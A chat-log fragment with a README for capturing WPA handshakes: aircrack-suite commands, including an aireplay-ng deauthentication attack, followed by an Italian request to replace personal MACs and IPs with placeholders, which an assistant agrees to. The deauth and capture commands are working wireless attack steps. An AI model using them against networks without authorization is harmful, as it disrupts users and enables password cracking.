...
- **Wireless Adapter:** Must support monitor mode & packet injection
  ...
  - Tested adapters: Alfa AWUS036ACH, TP-Link TL-WN722N v1
- **Tools:**
  ```bash
  sudo apt update
...
bash
sudo airodump-ng --bssid 56:60:91:35:9F:53 --channel 6 -w capture wlan0mon
...
bash
sudo aireplay-ng --deauth 10 -a 56:60:91:35:9F:53 wlan0mon
Parameters explained:
...
How it works: When a client is deauthenticated, it automatically re-authenticates, performing the 4-Way Handshake.

non includere informazioni sensibili e personali, deve essere tutto chiaro senza cose personali, metti delle XX non so, non includere i miei mac ip ecc
Hai perfettamente ragione. Ecco il README ripulito da tutte le informazioni personali (MAC address, BSSID, IP, date, nomi di reti personali come "sepultura", ecc.) e reso generico con placeholder come XX:XX:XX:XX:XX:XX, ESSID_EXAMPLE, ecc.
